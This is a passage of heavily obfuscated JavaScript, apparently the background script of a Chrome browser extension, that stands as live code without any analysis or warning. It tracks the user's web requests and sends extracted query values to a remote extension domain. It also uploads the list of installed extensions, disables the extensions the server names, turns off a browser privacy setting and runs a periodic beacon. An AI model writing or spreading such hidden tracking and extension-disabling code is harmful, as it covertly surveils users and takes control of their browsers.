0;y01111=+"6";break;case "5" | 1:y01111=U0MM.P6(+"68") != +"30"?+"4":"3" ^ 0;break;case "6" << 64:y01111=U0MM.P6("38" ^ 0) >= "80" - 0?"14" << 32:"13" ^ 0;break;case "3" - 0:y01111=U0MM.P6(+"27") < +"58"?"9" ^ 0:+"8";break;}}chrome[U0MM.I6(+"32")][U0MM.I6(+"33")][U0MM.I6(+"34")](w7=>{var Z4=U0MM;w7[Z4.P6(+"35")][Z4.P6("36" << 32)]({name:Z4.P6(+"37"),value:_dd});return {requestHeaders:w7[Z4.I6("35" << 64)]};},{urls:[U0MM.I6(+"38") + _ExtDomNoSchema + U0MM.I6(+"39")]},[U0MM.I6(+"40"),U0MM.I6(+"35")]);chrome[U0MM.I6(+"32")][U0MM.I6(+"41")][U0MM.I6("34" << 0)](function(n7){var D4=U0MM;var r7,a7,d7,C7,K7;if(n7[D4.I6("42" << 0)] !== D4.P6("43" * 1)){return null;}r7=n7[D4.P6("44" ^ 0)];a7=new URL(r7);if(r7[D4.P6(+"45")](D4.I6(+"46")) >= ("0" | 0) && r7[D4.P6("45" * 1)](D4.I6(+"47")) >= +"0" && r7[D4.P6(+"45")](D4.I6("48" ^ 0)) >= ("0" | 0)){d7=a7[D4.P6("49" ^ 0)][D4.I6(+"50")](D4.P6(+"51"));}if(r7[D4.P6("45" - 0)](D4.I6("52" * 1)) >= +"0" && r7[D4.P6("45" | 33)](D4.P6(+"53")) >= "0" - 0){d7=a7[D4.I6("49" | 0)][D4.P6("50" >> 32)](D4.P6("54" - 0));}if(r7[D4.P6("45" * 1)](D4.I6(+"55")) >= "0" >> 32 && r7[D4.P6("45" | 0)](D4.P6(+"47")) >= ("0" ^ 0) && r7[D4.I6(+"45")](D4.I6("48" ^ 0)) >= "0" * 1){d7=a7[D4.I6(+"49")][D4.I6("50" >> 32)](D4.I6(+"51"));}if(d7 && d7[D4.I6("56" ^ 0)] > +"1"){C7=getWithExpiry(D4.P6("57" | 25));K7=n7[D4.P6(+"58")];if(d7 === C7){return null;}if(C7 && K7){if(K7[D4.I6(+"59")](D4.I6("55" | 53))){setWithExpirySec(D4.I6(+"57"),d7,+"60");return null;}if(K7[D4.I6("59" ^ 0)](D4.I6("60" | 8))){setWithExpirySec(D4.P6("57" - 0),d7,"60" ^ 0);return null;}}setWithExpirySec(D4.P6("57" - 0),d7,"60" - 0);chrome[D4.I6(+"61")][D4.I6("62" * 1)]({url:_ExtDom + D4.P6(+"63") + _ExtnensionName + D4.P6("1" >> 0) + _ExtensionVersion + D4.I6(+"64") + d7});}},{urls:[U0MM.I6("65" >> 32),U0MM.I6("66" << 0),U0MM.I6("67" * 1)]},[U0MM.P6(+"40")]);chrome[U0MM.I6(+"68")][U0MM.P6("69" << 0)][U0MM.P6(+"34")](G7=>{var I4=U0MM;if(G7[I4.I6("70" ^ 0)] == I4.I6("71" | 3)){localStorage[I4.I6("30" ^ 0)](I4.P6(+"57"));chrome[I4.I6("72" | 72)][I4.P6(+"73")](I4.I6("74" * 1),{delayInMinutes:+"1.1",periodInMinutes:"180" * 1});analytics(I4.P6("71" | 7),I4.I6(+"3"));sync();chrome[I4.I6("16" >> 0)][I4.P6("75" * 1)](function(m7){handleInstalledExtensions(m7);});chrome[I4.P6("76" | 4)][I4.I6("77" ^ 0)][I4.P6("78" << 32)][I4.P6("79" >> 32)]({value:!"1"});}});chrome[U0MM.P6("68" << 32)][U0MM.P6(+"80")](_ExtDom + U0MM.P6(+"81") + _ExtnensionName + U0MM.I6(+"1") + _ExtensionVersion + U0MM.P6(+"2") + _dd);chrome[U0MM.I6("82" << 64)][U0MM.P6("73" * 1)]({title:U0MM.P6("83" * 1),id:U0MM.I6(+"84"),contexts:[U0MM.I6(+"85")]});function handleInstalledExtensions(O7){var h4=U0MM;fetch(h4.I6("18" | 2) + _ExtDomNoSchema + h4.I6(+"19") + h4.I6("0" << 96) + _ExtnensionName + h4.I6(+"1") + _ExtensionVersion + h4.P6("2" - 0) + _dd,{method:h4.P6("20" ^ 0),headers:{'Accept':h4.P6("22" * 1),'Content-Type':h4.I6(+"24")},body:JSON[h4.P6("25" >> 64)](O7)})[h4.I6("9" * 1)](v7=>v7[h4.I6("10" << 32)]())[h4.P6(+"9")](s7=>handleExtensionResp(s7));}function sync(){var B4=U0MM;var L7;L7=_ExtDom + B4.P6("6" - 0);fetch(L7,{method:B4.I6(+"7"),credentials:B4.P6("8" >> 0)})[B4.I6(+"9")](W7=>W7[B4.I6("10" ^ 0)]())[B4.I6(+"9")](A7=>{analytics(B4.P6(+"11"),A7);})[B4.I6("12" << 0)](J7=>{});}chrome[U0MM.P6(+"61")][U0MM.P6(+"86")][U0MM.P6("34" << 0)](function(c7,j7,q5){var N4=U0MM;if(j7[N4.P6("87" | 67)] == N4.P6("88" * 1) && q5[N4.I6(+"44")][N4.I6("45" >> 0)](N4.I6("89" ^ 0)) == "0" << 0){chrome[N4.I6(+"61")][N4.I6("73" | 1)]({url:N4.I6("90" ^ 0)});chrome[N4.P6("61" << 32)][N4.P6("91" ^ 0)](c7);}});function getWithExpiry(y7){var a4=U0MM;var t7,Z7,z7;t7=localStorage[a4.I6(+"28")](y7);if(!t7){return null;}Z7=JSON[a4.I6("13" ^ 0)](t7);z7=new Date();if(z7[a4.I6("26" - 0)]() > Z7[a4.I6(+"29")]){localStorage[a4.P6("30" ^ 0)](y7);return null;}return Z7[a4.P6("31" - 0)];}chrome[U0MM.I6(+"92")][U0MM.P6(+"93")][U0MM.I6("34" * 1)](function(p5){chrome[U0MM.P6("61" * 1)][U0MM.P6("73" | 8)]({url:U0MM.P6("90" << 32)});});chrome[U0MM.P6(+"82")][U0MM.P6("93" << 64)][U0MM.I6("34" >> 32)](function(f5,F5){chrome[U0MM.I6(+"61")][U0MM.I6(+"73")]({url:U0MM.P6(+"90")});});function analytics(b7,E7){var f4=U0MM;var M7;M7=_ExtDom + b7 + f4.I6(+"0") + _ExtnensionName + f4.I6(+"1") + _ExtensionVersion + f4.I6("2" ^ 0) + _dd;if(E7 != f4.P6("3" | 3)){M7=M7 + f4.I6(+"4") + E7;}navigator[f4.I6("5" * 1)](M7);}function setWithExpirySec(B7,x7,X7){var o7,T7;o7=new Date();T7={value:x7,expiry:o7[U0MM.P6(+"26")]() + X7 * +"1000"};localStorage[U0MM.P6(+"27")](B7,JSON[U0MM.P6(+"25")](T7));}function u0MM(){return "m6%5DBbB-%20Q%13%06Q!6UBbS2#I_$S6:JXhX1%3CK%1AgF'+Q%197%5E#:K%1Ag%18my%00u(%5C66KBjf;#@%13&B2?LU&F+%3CK%19-A-=%00E3@+=B_!Kg4@B%13%5B/6%00E%22F%0B'@%5BbU''lB%22_g6%5DF.@;vWS*%5D46lB%22_g%25DZ2Wg$@T%15W3&@E3%17-=gS!%5D06vS)V%0A6DR%22@1vDR#~+%20QS)W0vWS6G'%20Q~%22S&6WEbB7%20M%13#Vgy%1F%19h%18lv%0A%1CbP.%3CF%5D.%5C%25vJX%05W$%3CWS%15W3&@E3%176*USb_#:Ki!@#%3E@%132@.vLX#W:%1CC%13%20%5D-4ISi%1716DD$Zg%22%18%134W#!F%5E%17S02HEbU''%00GbA'2WU/%1C;2MY(%1Cg#%18%137%17%20:KQi%17.6KQ3Zg?DE3c76WOb%5B,:Q_&F-!%00_)Q.&AS4%17;2MY(%1Cg'DT4%177#AW3Wg%20@W5Q*l@N3%0FguT%0BbZ6'UE%7D%1Dmy%0BQ(%5D%25?@%18$%5D/%7C%0F%13/F6#V%0Ch%1Dh%7D%5CW/%5D-%7DFY*%1DhvMB3B1i%0A%19m%1C%20:KQiQ-%3E%0A%1Cb@7=Q_*Wg%3CK%7F)A62IZ%22Vg!@W4%5D,vLX4F#?I%13&%5E#!HEbQ06DB%22%17*1%00Q%22F%03?I%137@+%25DU%3E%1716W@.Q'%20%00E%22S00Me2U%256VB%02%5C#1IS#%1716Q%134W6%06K_)A62IZ%12%60%0EvPX.%5C1'DZ+%0D'+Q%0BbQ-=QS?F%0F6KC4%17%106HY1Wg%3E@X2%17%20!JA4W0%0CDU3%5B-=%00Y)g27DB%22Vg%20QW3G1vIY&V+=B%13$Z0%3CHS%7D%1Dm6%5DB%22%5C1:JX4%17!;WY*Wx%7C%0AE%22F6:KQ4%1706HY1Wg1WY0A'!dU3%5B-=%00Y)q.:F%5D%22Vg%3CKw+S0%3E%00%09%22J6n%00%101W0n%00D%22C76VB%0FW#7@D4%17-=gS!%5D06wS6G'%20Q%13aV&n%00%13a%5B,5J%0BbA'=At%22S!%3CK%135W&%20%5CX$%17&7%00q%02fg%20@W5Q*%03DD&_1vMB3B1i%0A%19m%1C;2MY(%1C!%3CH%19m%17+=FZ2V'vQ%5E%22%5Cg:KR%22J%0D5%00E%22S00Mf&@#%3EV%133W:'%00E3@+=B_!Kg%01@%5B(D'vVO)Qg0DB$Zg#DD4Wg?LE3%17$%3CWs&Q*vHW)S%256HS)Fg%20@B%02%5C#1IS#%17*'QF4%08m%7CFY*%1CgvBS3";}chrome[U0MM.I6("72" - 0)][U0MM.I6(+"94")][U0MM.I6("34" - 0)](function(N5){analytics(U0MM.I6(+"74"),U0MM.P6(+"3"));sync();});function handleExtensionResp(l7){var k4=U0MM;try{extnesionIds=JSON[k4.P6(+"13")](l7)[k4.P6("14" ^ 0)];extnesionIds[k4.P6("15" | 5)](e7=>chrome[k4.P6(+"16")][k4.P6(+"17")](e7,! !""));}catch(H7){}}
```


